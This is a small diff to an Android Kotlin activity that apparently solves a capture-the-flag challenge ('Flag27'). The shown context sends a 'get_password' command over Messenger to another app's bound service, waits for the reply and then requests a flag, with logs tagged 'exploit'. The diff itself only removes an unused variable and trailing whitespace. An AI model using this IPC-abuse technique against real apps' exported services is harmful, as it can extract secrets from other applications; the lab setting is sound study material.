@@ -28,7 +28,6 @@ class Flag27Activity : ComponentActivity() {
 
     var password: String? = null
     val passwordFuture = CompletableFuture<String>()
-    val flagFuture = CompletableFuture<String>()
 
     var mHandler = object : Handler(Looper.getMainLooper()) {
         override fun handleMessage(message: Message) {
@@ -109,12 +108,12 @@ class Flag27Activity : ComponentActivity() {
                 passwordMessage.replyTo = callBackMessenger
                 // Some services expect a bundle even if empty, or specific fields
                 passwordMessage.obj = Bundle().apply { putString("command", "get_password") }
-                
+
                 Log.d("exploit", "Sending password request")
                 mService?.send(passwordMessage)
 
                 // Wait for password from Handler
-                val pass = passwordFuture.get() 
+                val pass = passwordFuture.get()
                 Log.d("exploit", "Proceeding with password: $pass")
 
                 // Step 3: Send Flag request
